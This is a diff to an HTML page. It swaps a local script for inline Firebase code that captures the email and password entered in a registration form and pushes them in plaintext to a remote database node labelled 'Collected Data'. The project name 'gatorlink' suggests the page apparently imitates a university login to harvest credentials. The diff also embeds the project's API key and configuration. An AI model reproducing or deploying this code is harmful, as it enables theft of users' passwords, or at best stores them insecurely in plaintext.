@@ -64,6 +64,54 @@
           </div>
       </header>
 
-  <script src="customer.js"></script>
+      <script src= 
+      "https://www.gstatic.com/firebasejs/3.7.4/firebase.js"> 
+        </script> 
+        
+        <script> 
+          var firebaseConfig = { 
+            apiKey: "AIzaSyDnAfm2rBOKQVxKDXh5KsTr4r83Q-hBIiU",
+            authDomain: "gatorlink-fe67d.firebaseapp.com",
+            databaseURL: "https://gatorlink-fe67d-default-rtdb.firebaseio.com",
+            projectId: "gatorlink-fe67d",
+            storageBucket: "gatorlink-fe67d.appspot.com",
+            messagingSenderId: "398115674330",
+            appId: "1:398115674330:web:5a96520ea1c7d96b5d2de3",
+            measurementId: "G-PVSC2E9ZCV"
+          }; 
+      
+          firebase.initializeApp(firebaseConfig); 
+      
+          var messagesRef = firebase.database() 
+            .ref('Collected Data'); 
+          
+          document.getElementById('registration-form') 
+            .addEventListener('submit', submitForm); 
+      
+          function submitForm(e) { 
+            e.preventDefault(); 
+      
+            // Get values 
+            var email = getInputVal('email'); 
+            var password = getInputVal('password'); 
+      
+            saveMessage(email, password); 
+            document.getElementById('registration-form').reset(); 
+          } 
+      
+          // Function to get get form values 
+          function getInputVal(id) { 
+            return document.getElementById(id).value; 
+          } 
+      
+          // Save message to firebase 
+          function saveMessage(email, password) { 
+            var newMessageRef = messagesRef.push(); 
+            newMessageRef.set({
+              email: email, 
+              password: password, 
+            }); 
+          } 
+        </script> 
   </body>
 </html>
